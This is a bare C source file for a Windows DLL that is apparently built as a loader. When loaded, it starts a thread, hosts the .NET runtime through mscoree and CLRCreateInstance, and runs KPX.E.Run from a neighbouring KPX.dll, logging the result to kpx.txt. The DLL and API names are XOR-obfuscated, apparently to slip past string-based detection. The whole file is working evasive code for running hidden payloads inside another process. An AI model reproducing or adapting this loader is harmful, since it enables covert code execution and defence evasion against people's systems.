#include <windows.h>

typedef HRESULT (WINAPI *fnCCI)(REFCLSID, REFIID, LPVOID*);
typedef struct { void **vt; } Obj;

__attribute__((noinline)) static void xd(char *o, const volatile char *e, int n) {
    volatile char k = 0x37;
    for (int i = 0; i < n; i++) o[i] = e[i] ^ k;
}
__attribute__((noinline)) static void xw(wchar_t *o, const volatile wchar_t *e, int n) {
    volatile wchar_t k = 0x37;
    for (int i = 0; i < n; i++) o[i] = e[i] ^ k;
}

DWORD WINAPI W(LPVOID p) {
    Sleep(500);

    wchar_t mp[512] = {0};
    GetModuleFileNameW((HMODULE)p, mp, 500);
    wchar_t dr[512] = {0};
    wcscpy(dr, mp);
    wchar_t *sl = wcsrchr(dr, L'\\');
    if (sl) *sl = 0;

    wchar_t pp[512], sp[512], op[512];
    wsprintfW(pp, L"%s\\KPX.dll", dr);
    wsprintfW(sp, L"%s\\kpx_status.txt", dr);
    wsprintfW(op, L"%s\\kpx.txt", dr);

    HANDLE sf = CreateFileW(sp, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0x80, NULL);

    static const wchar_t em[] = {L'm'^0x37,L's'^0x37,L'c'^0x37,L'o'^0x37,L'r'^0x37,L'e'^0x37,L'e'^0x37,L'.'^0x37,L'd'^0x37,L'l'^0x37,L'l'^0x37,0^0x37,0};
    wchar_t mn[16]; xw(mn, em, 12);
    HMODULE hM = LoadLibraryW(mn);
    if (!hM) {
        if (sf != INVALID_HANDLE_VALUE) { DWORD w; WriteFile(sf, "e1\r\n", 4, &w, NULL); CloseHandle(sf); }
        return 1;
    }

    static const char ef[] = {'C'^0x37,'L'^0x37,'R'^0x37,'C'^0x37,'r'^0x37,'e'^0x37,'a'^0x37,'t'^0x37,'e'^0x37,'I'^0x37,'n'^0x37,'s'^0x37,'t'^0x37,'a'^0x37,'n'^0x37,'c'^0x37,'e'^0x37,0^0x37,0};
    char fn[24]; xd(fn, ef, 18);
    fnCCI pC = (fnCCI)GetProcAddress(hM, fn);
    if (!pC) {
        if (sf != INVALID_HANDLE_VALUE) { DWORD w; WriteFile(sf, "e2\r\n", 4, &w, NULL); CloseHandle(sf); }
        return 2;
    }

    static const GUID g1 = {0x9280188D,0x0E8E,0x4867,{0xB3,0x0C,0x7F,0xA8,0x38,0x84,0xE8,0xDE}};
    static const GUID g2 = {0xD332DB9E,0xB9B3,0x4125,{0x82,0x07,0xA1,0x48,0x84,0xF5,0x32,0x16}};
    static const GUID g3 = {0xBD39D1D2,0xBA2F,0x486a,{0x89,0xB0,0xB4,0xB0,0xCB,0x46,0x68,0x91}};
    static const GUID g4 = {0x90F1A06E,0x7712,0x4762,{0x86,0xB5,0x7A,0x5E,0xBA,0x6B,0xDB,0x02}};
    static const GUID g5 = {0x90F1A06C,0x7712,0x4762,{0x86,0xB5,0x7A,0x5E,0xBA,0x6B,0xDB,0x02}};

    Obj *m = NULL;
    HRESULT hr = pC(&g1, &g2, (LPVOID*)&m);
    if (FAILED(hr)) {
        if (sf != INVALID_HANDLE_VALUE) { char b[32]; wsprintfA(b, "e3 %08lx\r\n", hr); DWORD w; WriteFile(sf, b, lstrlenA(b), &w, NULL); CloseHandle(sf); }
        return 3;
    }

    static const wchar_t ev[] = {L'v'^0x37,L'4'^0x37,L'.'^0x37,L'0'^0x37,L'.'^0x37,L'3'^0x37,L'0'^0x37,L'3'^0x37,L'1'^0x37,L'9'^0x37,0^0x37,0};
    wchar_t vn[16]; xw(vn, ev, 11);

    typedef HRESULT (WINAPI *fnGR)(void*, LPCWSTR, REFIID, LPVOID*);
    Obj *ri = NULL;
    hr = ((fnGR)m->vt[3])(m, vn, &g3, (LPVOID*)&ri);
    if (FAILED(hr)) {
        if (sf != INVALID_HANDLE_VALUE) { char b[32]; wsprintfA(b, "e4 %08lx\r\n", hr); DWORD w; WriteFile(sf, b, lstrlenA(b), &w, NULL); CloseHandle(sf); }
        return 4;
    }

    typedef HRESULT (WINAPI *fnGI)(void*, REFCLSID, REFIID, LPVOID*);
    Obj *h = NULL;
    hr = ((fnGI)ri->vt[9])(ri, &g4, &g5, (LPVOID*)&h);
    if (FAILED(hr)) {
        if (sf != INVALID_HANDLE_VALUE) { char b[32]; wsprintfA(b, "e5 %08lx\r\n", hr); DWORD w; WriteFile(sf, b, lstrlenA(b), &w, NULL); CloseHandle(sf); }
        return 5;
    }

    typedef HRESULT (WINAPI *fnS)(void*);
    ((fnS)h->vt[3])(h);

    typedef HRESULT (WINAPI *fnE)(void*, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, DWORD*);

    static const wchar_t ek[] = {L'K'^0x37,L'P'^0x37,L'X'^0x37,L'.'^0x37,L'E'^0x37,0^0x37,0};
    wchar_t kn[8]; xw(kn, ek, 6);

    static const wchar_t er[] = {L'R'^0x37,L'u'^0x37,L'n'^0x37,0^0x37,0};
    wchar_t rn[8]; xw(rn, er, 4);

    DWORD ret = 0;
    hr = ((fnE)h->vt[11])(h, pp, kn, rn, op, &ret);

    if (sf != INVALID_HANDLE_VALUE) {
        char b[64]; wsprintfA(b, "ok %08lx %lu\r\n", hr, ret);
        DWORD w; WriteFile(sf, b, lstrlenA(b), &w, NULL); CloseHandle(sf);
    }
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hm, DWORD r, LPVOID x) {
    if (r == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hm);
        CreateThread(NULL, 0, W, (LPVOID)hm, 0, NULL);
    }
    return TRUE;
}
